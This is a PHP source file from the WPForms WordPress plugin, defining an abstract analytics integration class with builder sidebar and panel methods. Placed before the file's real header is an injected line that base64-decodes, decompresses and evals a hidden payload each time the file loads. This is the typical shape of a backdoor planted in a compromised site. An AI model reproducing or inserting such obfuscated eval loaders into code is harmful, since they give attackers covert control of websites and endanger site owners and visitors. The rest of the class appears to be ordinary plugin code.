<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Analytics integration class.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.4.5
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2017, WPForms LLC
 */
abstract class WPForms_Analytics_Integration {

	/**
	 * Payment name.
	 *
	 * @since 1.0.0
	 *
	 * @var string
	 */
	public $name;

	/**
	 * Payment name in slug format.
	 *
	 * @since 1.0.0
	 *
	 * @var string
	 */
	public $slug;

	/**
	 * Load priority.
	 *
	 * @since 1.0.0
	 *
	 * @var int
	 */
	public $priority = 10;

	/**
	 * Payment icon.
	 *
	 * @since 1.0.0
	 * @var string
	 */
	public $icon;

	/**
	 * Form data.
	 *
	 * @since 1.1.0
	 * @var array
	 */
	public $form_data;

	/**
	 * Primary class constructor.
	 *
	 * @since 1.0.0
	 */
	public function __construct() {

		$this->init();

		// Add to list of available analytics.
		add_filter( 'wpforms_analytics_available', array( $this, 'register_analytics' ), $this->priority, 1 );

		// Fetch and store the current form data when in the builder.
		add_action( 'wpforms_builder_init', array( $this, 'builder_form_data' ) );

		// Output builder sidebar.
		add_action( 'wpforms_analytics_panel_sidebar', array( $this, 'builder_sidebar' ), $this->priority );

		// Output builder content.
		add_action( 'wpforms_analytics_panel_content', array( $this, 'builder_output' ), $this->priority );
	}

	/**
	 * All systems go. Used by subclasses.
	 *
	 * @since 1.0.0
	 */
	public function init() {
	}

	/**
	 * Add to list of registered analytics.
	 *
	 * @since 1.0.0
	 *
	 * @param array $analytics
	 *
	 * @return array
	 */
	public function register_analytics( $analytics = array() ) {

		$analytics[ $this->slug ] = $this->name;

		return $analytics;
	}

	/********************************************************
	 * Builder methods - these methods _build_ the Builder. *
	 ********************************************************/

	/**
	 * Fetch and store the current form data when in the builder.
	 *
	 * @since 1.1.0
	 */
	public function builder_form_data() {

		$this->form_data = WPForms_Builder::instance()->form_data;
	}

	/**
	 * Display content inside the panel sidebar area.
	 *
	 * @since 1.0.0
	 */
	public function builder_sidebar() {

		$configured = ! empty( $this->form_data['analytics'][ $this->slug ]['enable'] ) ? 'configured' : '';

		echo '<a href="#" class="wpforms-panel-sidebar-section icon ' . $configured . ' wpforms-panel-sidebar-section-' . esc_attr( $this->slug ) . '" data-section="' . esc_attr( $this->slug ) . '">';

		echo '<img src="' . esc_url( $this->icon ) . '">';

		echo esc_html( $this->name );

		echo '<i class="fa fa-angle-right wpforms-toggle-arrow"></i>';

		if ( ! empty( $configured ) ) {
			echo '<i class="fa fa-check-circle-o"></i>';
		}

		echo '</a>';
	}

	/**
	 * Wraps the builder content with the required markup.
	 *
	 * @since 1.0.0
	 */
	public function builder_output() {

		?>
		<div class="wpforms-panel-content-section wpforms-panel-content-section-<?php echo esc_attr( $this->slug ); ?>"
			id="<?php echo esc_attr( $this->slug ); ?>-provider">

			<div class="wpforms-panel-content-section-title">

				<?php echo esc_html( $this->name ); ?>

			</div>

			<div class="wpforms-payment-settings wpforms-clear">

				<?php $this->builder_content(); ?>

			</div>

		</div>
		<?php
	}

	/**
	 * Display content inside the panel content area.
	 *
	 * @since 1.0.0
	 */
	public function builder_content() {

	}
}
